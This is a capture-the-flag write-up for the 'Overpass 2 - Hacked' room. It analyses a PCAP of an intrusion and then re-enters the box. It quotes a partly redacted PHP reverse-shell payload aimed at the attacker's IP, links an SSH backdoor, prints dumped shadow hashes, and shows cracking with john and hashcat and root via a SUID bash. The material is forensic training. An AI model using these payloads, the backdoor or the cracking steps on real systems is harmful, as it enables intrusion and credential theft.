# Overpass 2 - Hacked

## Task 1

Analyse PCAP file with Wireshark

```bash
wireshark overpass2.pcapng
```

#### URL used to upload shell
Chech HTTP requests with filter `http.request.method==POST`
`/************/`

#### payload

```php
<?php exec("rm /tmp**********4**2 >/tmp/f")?>

```

Attacker's machine: ip `192.***.***.145` port `4**2`

#### Password 

`whenevernoteartinstant.`


#### established persistance
https://github.com/NinjaJc01/ssh-backdoor


#### how many crackable with fasttrack passwords a there?
Find the request with `/etc/shadow` dump
using WireShark filter: `tcp.port == 4**2 and frame contains "shadow"`

Follwo found TCP request.

Found `sudo cat /etc/shadow` output:
```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
[...]
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::

```

Save them to file `pass.pwd`

Using john the ripper to crack them with fasttrack
```bash
john --wordlist=/opt/wordlists/fasttrack.txt pass.pwd
```

John foound passwords.


## Task 2

### What's the default hash for the backdoor?
Can be found on backdoor's GitHub page (see above) in `main.go` file:

`bdd04d9bb76***********************************************acd01fc2170e3`

### What's the hardcoded salt for the backdoor?
In the bottom of the same file as above:
`1c36*************a05`

### What was the hash that the attacker used?
Check the moste bottom of Follow TCP stream window (right where we found passwprd hashes):

```bash
6d053*******************************************e98ad1fec71bed
```

Saved hash to `backdoor.hash`

### Crack the hash using rockyou
From backdoor source we know that hashing algorytm is SHA512 and the order: `password` + `salt`
```golang
func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
}
```

Using `hashcat` to crach hash. Wiki: https://hashcat.net/wiki/doku.php?id=hashcat

Acording to wiki
```
 1710 | sha512($pass.$salt)  | Raw Hash, Salted and/or Iterated
```

So `1710` mode is what I need.

Add salt to our `backdoor.hash` file so it will look like `hash:salt`

Let's crack!

```bash
hashcat -m 1710 -a 0 -o backdoor.txt backdoor.hash /opt/wordlists/rockyou.txt
```

Results will be `hash:salt:<found_password>`:
```
6d0****c71bed:1c36************a05:no******16
```

## Task 3

Connect to box.

Box IP:
```bash
export IP=10.10.59.60
```


### What message did they leave as a heading? 

Got to http://<IP>

`H4********an`


### Using the information you've found previously, hack your way back in!

Using previously found info, connect to server.

But first enumerate!

```bash
mkdir nmap 

nmap -sV -sC -Pn -v -oN nmap/report $IP
```

```bash
ssh james@$IP -p <port>
james@10.10.59.60's password: *****
```


## Flag 1
```bash
cat ~/user.txt
```

## Flag 2

There is interesting file in james home directory: `.suid_bash`

Using it, we are in root shel!

```bahs
./.suid_bash -p

.suid_bash-4.4# whoami
root
```

Get the flag:
```bash
cat /root/root.txt
```